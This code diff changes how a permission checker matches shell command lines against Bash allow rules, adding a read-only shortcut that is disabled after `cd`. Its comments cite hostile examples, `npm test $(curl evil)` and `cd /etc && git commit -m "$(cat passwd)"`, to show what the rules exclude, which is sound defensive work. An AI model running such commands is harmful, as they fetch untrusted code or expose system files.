@@ -405,7 +405,10 @@ export function isShellTool(toolName: string): boolean {
  * by a rule, or, for the whole substitution at once, by `readOnly` (the
  * auto-mode pre-gate's proof that it reads only inside the working directory
  * and writes nothing). So `Bash(git commit:*)` covers `git commit -m "$(cat
- * <<'EOF' … EOF)"` but not `npm test $(curl evil)`. The read-only shortcut
+ * <<'EOF' … EOF)"` but not `npm test $(curl evil)`. A top-level command
+ * the same check proves read-only by itself needs no rule either
+ * (`Bash(gh api *)` covers `gh api x --jq y | head`), provided a rule covers
+ * at least one other command; the rule returned is that one. The read-only shortcut
  * is off when the line moves directory first (`cd /etc && git commit -m
  * "$(cat passwd)"`), since the check resolves paths from the working
  * directory. An unparseable line, or one with a construct the pre-gate does
@@ -449,13 +452,24 @@ export function findBashAllowRule(
 	const ruleFor = (raw: string) => bashRules.find((r) => r.pattern !== undefined && matchesBashPattern(r.pattern, raw));
 	const topLevel = parsed.segments.filter((seg) => seg.substitution === undefined && seg.raw.length > 0);
 	if (topLevel.length === 0) return undefined;
+	const topLevelMoves = topLevel.some(movesDirectory);
 	let first: PermissionRule | undefined;
 	for (const seg of topLevel) {
 		const rule = ruleFor(seg.raw);
-		if (!rule) return undefined;
-		first ??= rule;
+		if (rule) {
+			first ??= rule;
+			continue;
+		}
+		// A command the pre-gate proves read-only by itself needs no rule of its
+		// own (`gh api … | head`), as Claude Code allows a read-only subcommand
+		// on its own. Off after a `cd` on the line, whose later relative paths
+		// the proof would resolve from the wrong directory.
+		if (!topLevelMoves && opts.readOnly?.(seg.raw)) continue;
+		return undefined;
 	}
-	const topLevelMoves = topLevel.some(movesDirectory);
+	// At least one command must be the rule's: a line of read-only commands
+	// alone is the read-only fast path's to judge, not a rule's.
+	if (!first) return undefined;
 	for (const [index, text] of parsed.substitutions.entries()) {
 		const inner = parsed.segments.filter((seg) => seg.substitution === index);
 		if (inner.every((seg) => ruleFor(seg.raw))) continue;
